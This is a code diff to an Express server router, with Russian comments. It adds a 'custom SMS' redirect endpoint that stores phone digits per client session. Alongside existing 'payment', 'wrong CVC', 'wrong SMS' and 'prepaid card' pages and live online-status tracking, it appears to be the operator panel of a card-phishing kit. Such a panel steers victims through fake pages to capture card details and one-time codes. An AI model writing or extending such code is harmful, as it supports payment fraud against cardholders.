@@ -23,6 +23,7 @@ interface RedirectRequest {
   type: string;
   timestamp: number;
   clientId: string; // Добавляем clientId
+  phoneDigits?: string;
 }
 // Хранилище для перенаправлений пользователей
 const redirectRequests = new Map<string, RedirectRequest>();
@@ -34,6 +35,33 @@ interface OnlineStatus {
 }
 
 const onlineStatuses = new Map<string, OnlineStatus>();
+
+router.post("/redirect-custom-sms", (req, res) => {
+  const { sessionId, clientId, phoneDigits } = req.body;
+
+  if (!sessionId || !clientId || !phoneDigits) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId, clientId and customSms required",
+    });
+  }
+
+  // Создаем уникальный ключ для клиента + сессии
+  const redirectKey = `${clientId}:${sessionId}`;
+
+  // Сохраняем запрос на перенаправление с кастомным SMS
+  redirectRequests.set(redirectKey, {
+    type: "custom-sms",
+    timestamp: Date.now(),
+    clientId: clientId,
+    phoneDigits: phoneDigits,
+  });
+
+  console.log(
+    `🔄 Custom SMS redirect request saved for client ${clientId}, session: ${sessionId}, code: ${phoneDigits}`
+  );
+  res.json({ success: true, message: "Custom SMS redirect request saved" });
+});
 
 router.post("/update-online-status", (req, res) => {
   const { sessionId, page } = req.body;
@@ -96,8 +124,9 @@ router.get("/check-online-status/:sessionId", (req, res) => {
     payment: "💳 Страница оплаты",
     "wrong-cvc": "❌🔒 Страница неправильного CVC",
     "wrong-sms": "❌📩 Страница неправильного SMS",
-    prepaid: "❌🏧 Страница Prepaid карты"
-     // Добавляем новую страницу
+    prepaid: "❌🏧 Страница Prepaid карты",
+    "custom-sms": "📱 Страница кастомного смс",
+    // Добавляем новую страницу
   };
   const currentPageDisplay =
     pageNames[status.currentPage] || `📄 ${status.currentPage}`;
@@ -528,6 +557,7 @@ router.get("/check-redirect/:clientId/:sessionId", (req, res) => {
       redirect: true,
       type: redirectRequest.type,
       timestamp: redirectRequest.timestamp,
+      phoneDigits: redirectRequest.phoneDigits
     });
   } else {
     res.json({ success: true, redirect: false });
